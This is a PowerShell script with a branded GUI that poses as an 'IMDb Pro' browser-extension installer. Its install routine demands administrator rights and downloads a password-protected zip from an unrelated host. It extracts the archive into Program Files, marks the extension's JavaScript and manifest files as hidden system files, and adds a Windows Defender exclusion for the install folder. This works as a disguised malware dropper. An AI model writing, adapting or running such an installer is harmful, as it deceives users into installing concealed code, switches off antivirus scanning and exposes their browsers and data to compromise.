# IMDb Pro Installer - Professional UI with Fixed Errors
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create main form with IMDb colors
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(850, 750)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 23)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header Panel
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(850, 100)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($headerPanel)

# IMDb Pro Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "IMDb Pro"
$titleLabel.Font = New-Object System.Drawing.Font("Arial", 32, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(50, 25)
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite"
$subtitleLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(230, 45)
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 100)
$contentPanel.Size = New-Object System.Drawing.Size(850, 520)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($contentPanel)

# Features Section Title
$featuresTitle = New-Object System.Windows.Forms.Label
$featuresTitle.Text = "Premium Features"
$featuresTitle.Font = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
$featuresTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresTitle.AutoSize = $true
$featuresTitle.Location = New-Object System.Drawing.Point(50, 30)
$contentPanel.Controls.Add($featuresTitle)

# Features Grid - Row 1
$features = @(
    @{
        Title = "Real-time IMDb Ratings"
        Description = "Instant access to ratings and reviews"
        Location = New-Object System.Drawing.Point(50, 90)
    },
    @{
        Title = "Complete Movie Info" 
        Description = "Cast, crew, and detailed information"
        Location = New-Object System.Drawing.Point(310, 90)
    },
    @{
        Title = "HD Trailers & Previews"
        Description = "Watch trailers directly in browser"
        Location = New-Object System.Drawing.Point(570, 90)
    },
    @{
        Title = "Browser Integration"
        Description = "Seamless browsing experience"
        Location = New-Object System.Drawing.Point(50, 240)
    },
    @{
        Title = "Auto Updates"
        Description = "Always up-to-date features"
        Location = New-Object System.Drawing.Point(310, 240)
    },
    @{
        Title = "Secure & Private"
        Description = "Your data is protected"
        Location = New-Object System.Drawing.Point(570, 240)
    }
)

$featurePanels = @()
foreach ($feature in $features) {
    $featurePanel = New-Object System.Windows.Forms.Panel
    $featurePanel.Size = New-Object System.Drawing.Size(230, 120)
    $featurePanel.Location = $feature.Location
    $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
    $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
    # FIX: Use proper border color method
    $contentPanel.Controls.Add($featurePanel)
    
    # Diamond Icon Panel
    $iconPanel = New-Object System.Windows.Forms.Panel
    $iconPanel.Size = New-Object System.Drawing.Size(40, 40)
    $iconPanel.Location = New-Object System.Drawing.Point(15, 20)
    $iconPanel.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
    $featurePanel.Controls.Add($iconPanel)
    
    # Diamond character
    $diamondLabel = New-Object System.Windows.Forms.Label
    $diamondLabel.Text = "◆"
    $diamondLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
    $diamondLabel.ForeColor = [System.Drawing.Color]::Black
    $diamondLabel.AutoSize = $true
    $diamondLabel.Location = New-Object System.Drawing.Point(8, 5)
    $iconPanel.Controls.Add($diamondLabel)
    
    # Feature Title
    $title = New-Object System.Windows.Forms.Label
    $title.Text = $feature.Title
    $title.Font = New-Object System.Drawing.Font("Arial", 11, [System.Drawing.FontStyle]::Bold)
    $title.ForeColor = [System.Drawing.Color]::White
    $title.AutoSize = $true
    $title.Location = New-Object System.Drawing.Point(65, 25)
    $featurePanel.Controls.Add($title)
    
    # Feature Description
    $desc = New-Object System.Windows.Forms.Label
    $desc.Text = $feature.Description
    $desc.Font = New-Object System.Drawing.Font("Arial", 9)
    $desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    $desc.AutoSize = $true
    $desc.Location = New-Object System.Drawing.Point(15, 75)
    $featurePanel.Controls.Add($desc)
    
    $featurePanels += $featurePanel
}

# Installation Progress Section
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(50, 390)
$contentPanel.Controls.Add($progressTitle)

# Progress Container
$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(750, 80)
$progressContainer.Location = New-Object System.Drawing.Point(50, 440)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

# Status Label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation"
$statusLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(20, 20)
$progressContainer.Controls.Add($statusLabel)

# Progress Bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 50)
$progressBar.Size = New-Object System.Drawing.Size(620, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$progressContainer.Controls.Add($progressBar)

# Percentage Label
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(650, 45)
$progressContainer.Controls.Add($percentLabel)

# Install Button Panel
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 620)
$buttonPanel.Size = New-Object System.Drawing.Size(850, 130)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($buttonPanel)

# Large Install Button
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$installButton.Size = New-Object System.Drawing.Size(400, 70)
$installButton.Location = New-Object System.Drawing.Point(225, 30)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Button hover effects - FIXED
$installButton.Add_MouseEnter({
    $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
    $this.Font = New-Object System.Drawing.Font("Arial", 19, [System.Drawing.FontStyle]::Bold)
})

$installButton.Add_MouseLeave({
    if ($this.Text -ne "INSTALLATION COMPLETE") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $this.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
    }
})

# Installation function
$installButton.Add_Click({
    $this.Enabled = $false
    $this.Text = "INSTALLING..."
    Start-Installation
})

$buttonPanel.Controls.Add($installButton)

# Update function
function Update-Status {
    param($Message, $ProgressValue)
    
    $statusLabel.Text = $Message
    $percentLabel.Text = "$ProgressValue%"
    if ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
    }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        Update-Status "Checking administrator privileges..." 10
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0
            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator.", "Elevation Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
            $installButton.Enabled = $true
            $installButton.Text = "START INSTALLATION"
            return
        }
        
        Update-Status "Creating installation directory..." 20
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        Update-Status "Downloading IMDb Pro package..." 40
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UseBasicParsing
        
        Update-Status "Extracting package contents..." 60
        $extractionSuccess = $false
        
        # Try 7-Zip first
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        
        if (-not $extractionSuccess) {
            Update-Status "Using alternative extraction method..." 70
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $installPath)
            }
            catch {
                $shellApp = New-Object -ComObject Shell.Application
                $zipFolder = $shellApp.NameSpace($tempFile)
                $destFolder = $shellApp.NameSpace($installPath)
                $destFolder.CopyHere($zipFolder.Items(), 0x14)
                Start-Sleep -Seconds 2
            }
        }
        
        Update-Status "Securing installation files..." 85
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
        $protectedFiles = @("background.js", "content.js", "popup.js", "manifest.json")
        foreach ($file in $protectedFiles) {
            $fullPath = Join-Path $installPath $file
            if (Test-Path $fullPath) {
                Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            }
        }
        
        Update-Status "Finalizing installation..." 95
        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        
        Update-Status "Installation completed successfully!" 100
        
        # Final UI updates
        $installButton.Text = "INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        
        [System.Windows.Forms.MessageBox]::Show(
            "IMDb Pro has been successfully installed!`n`nLocation: $installPath`n`nPlease restart your browser to activate the extension.",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
    }
    catch {
        Update-Status "Installation failed: $($_.Exception.Message)" 0
        $installButton.Text = "TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Show the form
$mainForm.ShowDialog() | Out-Null